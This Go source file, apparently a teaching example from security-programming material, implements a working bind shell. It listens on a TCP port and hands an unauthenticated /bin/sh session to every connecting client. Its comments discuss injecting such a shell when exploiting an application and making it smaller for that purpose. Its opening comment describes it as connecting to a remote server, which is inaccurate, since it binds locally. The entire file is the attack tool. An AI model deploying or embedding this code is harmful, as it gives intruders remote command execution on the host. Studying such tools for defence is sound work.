// Connect to a remote server and open a shell session
package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

// When compiling this example on Windows, it comes out to 1186 bytes.
// Considering that some shells written in C/Assembly can be under 100 bytes,
// it could be considered relatively large. If you are exploiting an application,
// you may have very limited space to inject a bind shell.
// You could make the example smaller by omitting the log package,
// removing the optional command-line arguments, and ignoring errors.

var shell = "/bin/sh"

func main() {
	// Handle command line arguments
	if len(os.Args) != 2 {
		fmt.Println("usage: " + os.Args[0] + " <bindAddress>")
		fmt.Println("example: " + os.Args[0] + " 0.0.0.0:9999")
		os.Exit(1)
	}

	// Bind socket
	listener, err := net.Listen("tcp", os.Args[1])
	if err != nil {
		log.Fatal("error connecting. ", err)
	}
	log.Println("now listening for connections.")

	// Listen and serve shells forever
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("error accepting connection. ", err)
		}
		go handleConnection(conn)
	}
}

// handleConnection executes a shell in a thread for each incoming connection
func handleConnection(conn net.Conn) {
	log.Printf("connection received from %s. Opening shell.", conn.RemoteAddr())
	conn.Write([]byte("connection established. Opening shell.\n"))
	// Use the reader/writer interface to connect the pipes
	command := exec.Command(shell)
	command.Stdin = conn
	command.Stdout = conn
	command.Stderr = conn
	command.Run()
	log.Printf("shell ended for %s", conn.RemoteAddr())
}
